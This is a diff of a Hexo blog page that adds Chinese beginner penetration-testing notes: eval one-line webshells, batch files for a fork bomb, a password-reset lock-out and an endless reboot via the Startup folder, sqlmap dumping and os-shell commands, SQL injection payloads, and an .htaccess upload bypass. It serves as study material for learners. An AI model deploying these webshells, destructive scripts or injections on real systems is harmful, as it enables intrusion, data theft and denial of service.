@@ -84,16 +84,86 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1、    入门基础篇<br>肉鸡<br>一句话木马（配合菜刀）<br>    ·PHP：<?php@eval($_POST[‘chabug’]);?><br>    ·ASP：&lt;%eval request(“chabug”)%&gt;<br>    ·ASP.NET：&lt;%@Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“chabug”],”unsafe”);%&gt;<br>    ·Customize:自定义类型，功能代码在服务端保存，理论上支持所有动态脚本。只要正确与菜刀进行交互即可</p>
-<p>菜刀<br>    1、    文件管理<br>    2、    虚拟终端<br>    3、    数据库管理<br>    4、    网站蜘蛛<br>    5、    定时提醒<br>    6、    快速启动<br>    7、    浏览器</p>
-<p>Webshell脚本木马<br>    后门<br>    弱口令<br>    弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测    到或被破解工具破解的口令均为弱口令<br>    免杀<br>    基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀</p>
-<p>2、    信息搜集篇<br>信息搜集<br>    域名信息whois        社工、弱口令<br>    IP，端口                nmap、msf<br>    找后台                弱口令<br>    子域名                旁站<br>    Web服务器指纹        寻找相应漏洞<br>    信息泄露            phpinfo()、物理路径</p>
+        <p>1、    65入门基础篇<br>肉鸡<br>一句话木马(配合菜刀)<br>    ·PHP：<?php@eval($_POST[‘chabug’]);?><br>    ·ASP：&lt;%eval request(“chabug”)%&gt;<br>    ·ASP.NET：&lt;%@Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“chabug”],”unsafe”);%&gt;<br>    ·Customize:自定义类型，功能代码在服务端保存，理论上支持所有动态脚本。只要正确与菜刀进行交互即可</p>
+<p>菜刀<br>1、    文件管理<br>2、    虚拟终端<br>3、    数据库管理<br>4、    网站蜘蛛<br>5、    定时提醒<br>6、    快速启动<br>7、    浏览器</p>
+<p>Webshell脚本木马<br>后门<br>弱口令<br>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人(他们有可能对你很了解)猜测到或被破解工具破解的口令均为弱口令<br>免杀<br>    基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀</p>
+<pre><code>靶场环境搭建</code></pre><p>1、    常见端口以及对应的服务<br>21                        ftp<br>23                        telnet<br>80                        web<br>80-89                    可能是web<br>443                        ssl心脏地穴以及一些web漏洞测试<br>445                        smb<br>1433                        mssql<br>1521                        oracle<br>2082/2083                cpanel主机管理系统登录<br>2222                        DA虚拟主机管理系统登录<br>3128                        squid代理默认端口&gt;漫游内网<br>3306                        mysql<br>3312/3311                kangle主机管理系统登录<br>3389                        远程桌面<br>5432                        PostgreSQL<br>5900                        vnc<br>6379                        redis未授权<br>7001，7002                WebLogin默认弱口令，反序列<br>7778                        kloxo主机控制面板登录<br>8000-9090                都是一些常见的web的端口<br>8080tomcat/WDCP            主机管理系统，默认弱口令<br>8080，8089，9090        jboss<br>8083                        Vestacp主机管理系统<br>8649                        ganglia<br>8888amh/LuMacager/        宝塔主机默认管理系统默认端口<br>10000                    Virtualmin/Webmin服务器虚拟主机管理系统<br>11211                    memcache未授权访问<br>27017，27018                Mongodb未授权访问<br>28017                    mongodb统计页面</p>
+<p>2、    常见的cmd命令以及bat<br>1、    echo<br>2、    dir<br>3、    d:和cd<br>4、    tree<br>5、    md创建目录rd删除目录<br>6、    ipconfig<br>7、    cls<br>8、    copy复制，拼接文件<br>9、    move移动文件<br>10、    ren重命名<br>11、    del删除文件<br>12、    ping<br>13、    type<br>14、    reg<br>15、    nslookup -d <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>16、    find<br>17、    tasklist<br>18、    ver、winver<br>19、    start<br>20、    systeminfo<br>21、    logoff<br>22、    shutdown /s /f /t /a /r /g /l<br>23、    telnet 192.168.1.1<br>24、    arp -a<br>25、    at<br>26、    net</p>
+<p>3、    实战cmd编写bat病毒<br>耗尽资源的bat病毒<br>start cmd<br>%0</p>
+<p>锁机病毒<br>echo net user administrator 123456 &gt; c:\windows\Temp\1.bat<br>echo shutdon /r /t 0 &gt;&gt; c:\windows\tmp\1.bat</p>
+<p>无限重启病毒<br>echo shutdown /r /t 0 &gt;c:\windows\temp\1.bat<br>copy c:\windows\temp\1.bat “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\”</p>
+<p>4、    widnows系统目录结构与渗透的关系<br>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\”    开机启动目录<br>c:\windows\temp\1.bat        重启后自动清空</p>
+<pre><code>网络基础</code></pre><p>1、    HTTP协议<br>协议状态码：<br>        200    Ok                    //刻划断请求成功</p>
+<p>400 Bad Request        //客户端请求有语法错误，不能被服务器所理解</p>
+<p>401    Unauthorized            //请求未经授权，这个状态码必须和WW                                W-Authenricate报头域一起使用</p>
+<p>403    Forbidden            //服务器收到请求，但是拒绝提供服务</p>
+<p>404    Not Found            //请求的资源不存在，输入了错误的URL</p>
+<p>500    Internal Server Error    //服务器发生了不可预期的错误</p>
+<p>503    Server Unavailable    //服务器当前不能处理客户端的请求，一                    段时间后可能恢复正常</p>
+<p>2、    内外网划分<br>解决公网IP不够用</p>
+<p>HTML基础<br>1、    HTML简介<br>HTML是用来描述网页的一种语言<br>HTML指的是超文本标记语言<br>HTML不是一种编程语言，而是一种标记语言<br>标记语言是一套标记标签<br>HTML使用标记标签来描述网页<br>HTML文档包含了HTML标签以及文本内容<br>HTML文档也叫做WEB页面</p>
+<p>2、    常用标签<br><a href="https://www.w3school.com.cn/tags/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/index.asp</a></p>
+<pre><code>数据库基础</code></pre><p>1、    关系型数据库概念<br>关系数据库，是建立在关系模型基础上的数据库，借助集合代数等数学概念和方法来处理数据库中的数据<br>    当前主流的关系数据库有Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access、MySQL、浪潮K-DB等<br>SQL语言：通用，功能极强的关系数据库语言<br>2、    SQL server</p>
+<p>3、    MYSQL<br>sqlserver和mysql大同小异，所以直接安装phpstudy<br>4、    基本操作<br>显示数据库    show    database;<br>创建数据库    creat database    test1;<br>删除数据库    drop database;<br>打开数据库    use test1;<br>显示当前打开的数据库    select database();<br>显示数据表字段    describe 表名;<br>当前数据库表结构    show table;</p>
+<p>5、    数据类型<br><a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-data-types.html</a><br>创建数据表    create table [表名] ([字段名] <a href="[字段要求]">字段类型</a>[字段参数]…);<br>更改数据表    alter table [表名] add column [字段名] datatype<br>alter table [表名] add primary key ([字段名])<br>说明：更改表的定义把栏位设为主键<br>alter table [表名] drop primary ([字段名])<br>显示当前表字段    show columns from tablename;</p>
+<p>6、    增删改查<br>添加    insert into [表名] values(‘’,’’,’’);<br>查询 select * from [表名] where ([条件]);<br>删除delete from [表名] where ([条件]);<br>修改update [表名] set [修改内容如name=’baidu’] where [条件]; </p>
+<p>2、    信息搜集篇<br>信息搜集<br>    域名信息whois        社工、弱口令<br>    IP，端口                nmap、msf<br>    找后台                弱口令<br>    子域名                旁站<br>    Web服务器指纹        寻找相应漏洞<br>    信息泄露            phpinfo()、物理路径<br>几种手段<br>1、    whois信息<br>whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等，对后期社工很有用。同时该工具还可以查询同一注册人的其他的域名，域名对应的ns记录、mx记录，自动识别国内常见的托管商（万网、新网等）</p>
+<p>2、    子域名<br>1、    搜索引擎搜索百度的子域名inurl:baidu.com<br>2、    子域名挖掘机layer<br>3、    subDomainBrute<br>4、    <a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a><br>5、    穷举爆破</p>
+<p>3、    目标真实IP<br>没加入CDN的网站只需要ping就能得到IP<br>加了CDN：二级域名法<a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a><br>域名历史解析：<a href="https://x.threatbook.cn" target="_blank" rel="noopener">https://x.threatbook.cn</a></p>
+<p>4、    旁站c段（目标站点服务器上的其他网站）<br><a href="http://webscan.cc" target="_blank" rel="noopener">http://webscan.cc</a><br>nmap</p>
+<p>5、    邮箱<br>先确定目标邮件服务器的真实位置，查看是否有错误配置，例如，没有金童very或者expm命令导致用户信息泄露，然后从whois获取域名的注册人、管理员邮箱，利用搜索引擎或者社工库查看有没有泄露的密码，尝试进行登录，最后从目标站点上搜索邮箱，例如对网站上的“联系我们”，发送钓鱼邮件</p>
+<p>6、    cms类型（cms：内容管理系统）<br>识别方式<br>网站特有文件/templets/default/style/dedecms.css——dedecms<br>网站独有文件的md5<br>网站命名规则<br>返回头的关键字，网页关键字<br>url特征<br>script特征<br>robot.txt<br>网站路径特征<br>网站静态资源<br>爬取网站目录信息<br>云悉：<a href="http://yunsee.cn" target="_blank" rel="noopener">http://yunsee.cn</a><br>whatweb：<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></p>
+<p>7、    敏感文件<br>.git    .svn    .DB_store源代码泄露<br>扫描工具：    御剑    dirbrute</p>
+<p>8、    端口信息<br>nmap、masscan扫描探测</p>
+<p>9、    服务器和中间件<br>获取web容器，寻找相应漏洞<br>服务器版本漏洞，linux或者windows<br>whatweb</p>
+<p>10、    其他<br>waf防火墙    <a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a></p>
+<p>cookie信息查看waf信息，然后寻找绕过这些waf的方法<br>安全狗            safedog：<strong>**</strong><br>360主机卫士        360：：<strong>**</strong><br>护卫神             Hsw：<strong>**</strong></p>
+<p>历史漏洞信息：    <a href="https://bugs.shuimuga.com/" target="_blank" rel="noopener">https://bugs.shuimuga.com/</a></p>
 <p>漏洞挖掘<br>    Wen应用层<br>        编辑器<br>        文件包含<br>        文件上传<br>        文件下载<br>        SQL注入<br>        XSS<br>        CSRF<br>        越权<br>        弱口令<br>        逻辑漏洞<br>    服务器<br>        弱口令        mstsc的3389端口弱口令密码<br>        shift后门    3389端口按5下shift<br>        msf</p>
+<p>后台查找<br>1、    源代码    网站引用图片的是时候可能会暴露自己的后台<br>2、    robot.txt<br>一种存放在网页根目录下的ASCII编码的文本文件，他通常告诉网络搜索引擎的漫游器（网络蜘蛛），此网站中的那些内容是不应该被搜索引擎的漫游器获取的，那些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robot.txt的文件名统一为小写，robot.txt应放在网站的根目录下</p>
+<p>3、    BurpSuite<br>    Spider爬虫模块        主动式<br>    Scanner扫描模块        主动式<br>    Target模块            被动式</p>
+<p>4、    扫描器<br>御剑<br>wwwscan<br>w9scan<br>awvs</p>
+<p>5、    Google        如果在robot.txt内没有禁止搜索引擎收录的话，可以使用<br>inurl:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> intitle:后台 管理 登录<br>site:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> intext:登录<br>更多语法：<a href="https://zhuanlan.zhihu.com/p/22161675" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22161675</a></p>
+<p>6、    其他<br>找DEDECMS后台目录——<a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">https://xz.aliyun.com/t/2064</a></p>
 <p>漏洞利用</p>
 <p>权限提升</p>
 <p>权限维持<br>    隐蔽<br>    周期查看<br>    免杀<br>    多种留后门位置权限</p>
 <p>内网渗透</p>
 <p>日志清扫<br>    严谨<br>    伪装隐藏<br>    避免机警</p>
+<p>3、    SQL注入篇</p>
+<p>虚拟机安装<br>phpstudy安装及基本操作<br>ASP小旋风安装及基本操作<br>mysql+php注入靶场<br>access+asp靶场</p>
+<pre><code>SQLMAP篇
+    sqlmap安装</code></pre><p>1、下载sqlmap和python2<br>        <a href="https://www.python.org/downloads/release/python-2716/" target="_blank" rel="noopener">https://www.python.org/downloads/release/python-2716/</a><br>        <a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a></p>
+<p>2、安装</p>
+<p>3、验证安装<br>        cmd下输入<br>        puthon<br>        sqlmap.py -h</p>
+<p>sqlmap常规使用<br>1、    常规验证注入<br>指定url验证是否存在注入sqlmap .py -u “网页url”</p>
+<p>2、    跑数据<br>获取当前mysqls中的所有数据库sqlmap .py -u “网页url” –dbs<br>获取当前数据库名字    –current-db<br>获取security下的数据表 -D “security” –tables<br>获取users表下的列名 -D “security” -T “users” –columns<br>导出数据-D “security” -T “users” -C “id,username,password” –columns –dump</p>
+<p>3、    cookie注入<br>sqlmap -u “网页url” –cookie “uid=1” -–level 2<br>level为2或2以上时，才会尝试注入cookie参数，3或3以上时，会对user-agent和referer进行注入。</p>
+<p>4、    post注入<br>1、    配合burp抓请求包，然后sqlmap.py -r 1.txt<br>2、    自动搜索表单尝试注入 sqlmap.py -u “网页url” –forms</p>
+<pre><code>sqlmap进阶使用</code></pre><p>1、    前提要点<br>网站必须是root权限<br>需要知道网站的绝对路径<br>gpc为off，php主动转义的功能关闭：<br>gpc会把<br>’转为\’<br>“转为”<br>\转为\<br>My.ini下的secure_file_priv=””</p>
+<p>2、    文件操作<br>–file-read    #读取指定文件<br>–file-write    #写入本地文件<br>–file-dest    #要写入的文件绝对路径<br>有时可能会执行无反应，删除缓存 rm -rf /root/.sqlmap/即可<br>3、    命令执行<br>sqlmap -u “网页url” –-os-cmd=”ipconfig”<br>–os-cmd=”要执行的命令”        #执行系统命令<br>sqlmap -u “网页url” –-os-shell<br>–os-shell                    #系统交互shell</p>
+<pre><code>ACCESS注入</code></pre><p>1、    access数据库结构<br>.mdb后缀命名<br>一个文件就是一个数据库，和mysql不同<br>打开方式可以用office或者第三方<br>表名——字段名——数据内容</p>
+<p>2、    注入的基本流程<br>》判断注入是否存在<br>1、    单引号报错<br>2、    逻辑型and 1=1 and 1=2<br>3、    变量做运算-减号</p>
+<p>》猜解表名<br>》猜解字段数<br>》猜解字段名<br>》猜解内容长度<br>》猜解内容</p>
+<p>3、    常见的注入查询方式<br>1、    联合查询法 union select<br>判断注入：and 1=1    and 1=2<br>猜有多少列：order by 22<br>猜表名并记录回显位union select 1,2,3,4,5,6,7,8…… from admin<br>猜列名：union select 1,2,username,4,5,6,7,8…… from admin</p>
+<p>2、    逐字猜解法<br>判断注入：and 1=1    and 1=2<br>and exists(select * from admin)——猜表名<br>and exist(select user_name from admin)<br>查数据：1.确定长度2.确定asc数据(asc编码)<br>and (select top 1 len(user_name)from admin)=5<br>判断第一位（97代表“a”的ascII值）and(select top 1 asc(mid(user_name,1,1)) from admin)=97<br>判断第二位and(select top 1 asc (mid(user_name,1,2)) from admin)=97</p>
+<pre><code>MySQL注入</code></pre><p>1、    数据库结构：数据库》库》表》列<br>2、    MySQL5注入流程：获取字段数-查库名-查表名-查列名-查数据<br>获取字段数：order by 临界值一个个试<br>获取库名：databse();<br>表名信息:information_schema.tables<br>列名信息: information_schema.columns</p>
+<pre><code>MySQL注入分类</code></pre><p>1、    字符型<br>$sql=”select * from users where id=’$id’”;<br>$sql=”select * from users where id=((‘$id’))”;<br>$sql=”select * from users where id=(‘$id’)”;</p>
+<p>$id=’”’.$id.’”’;<br>$sql=”select * from users where id=$id”;</p>
+<p>$id=’(“’.$id.’”)’;<br>$sql=”select * from users where id=$id”;</p>
+<p>2、    数字型<br>数字型和字符型的注入方式是一样的，不必纠结区别<br>3、    搜索型(模糊搜索)<br>select * from users where username like “%3”    //查3结尾的数据</p>
+<p>4、    cookie注入<br>$sql=”select * from users where id=”.$_cookie[‘uid’];</p>
+<p>5、    HTTP头注入<br>头字段：<a href="https://zh.wikipedia.org/wiki/HTTP头字段" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/HTTP头字段</a><br>常见的头字段<br>        X-Forwarded-For<br>            是客户端通过HTTP代理或者负载均衡器连接到web            服务端获取源IP地址的一个标准<br>            类似的有：<br>            x-originating-IP：127.0.0.1<br>            x-Forwarded-For：127.0.0.1<br>            x-Remote-IP：127.0.0.1<br>            x-Remote-Addr：127.0.0.1<br>            Client-IP：127.0.0.1</p>
+<pre><code>User-agent
+    用来统计目标和违规协议
+
+Referer
+    记录跳转信息</code></pre><p>4、    文件上传<br>    写个上传点——真正用来上传文件的地方<br>        move_uploaded_file()函数<br>        $_FILES全局数组<br>        upload-labs-env集成环境<a href="https://github.com/c0ny1/upload-labs/releases" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs/releases</a></p>
+<pre><code>上传突破</code></pre><p>.htaccess原理        //把1.jpg当成php文件来解析<br>&lt;FilesMatch “1.jpg”&gt;<br>SetHandler application/x-httpd-php<br><br>或者AddType application/x-httpd-php.jpg</p>
+<p>5、    XSS&amp;CSRF</p>
+<p>6、    权限提升</p>
+<p>7、    权限维持</p>
+<p>8、    正向反向代理</p>
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
@@ -110,7 +180,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/09/22/hello-world/" data-id="ck0yoda4a0000o4v0pc5jwba7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/09/22/hello-world/" data-id="ck1ke7vfe00007cv0itwia3eq" class="article-share-link">Share</a>
       
       
     </footer>
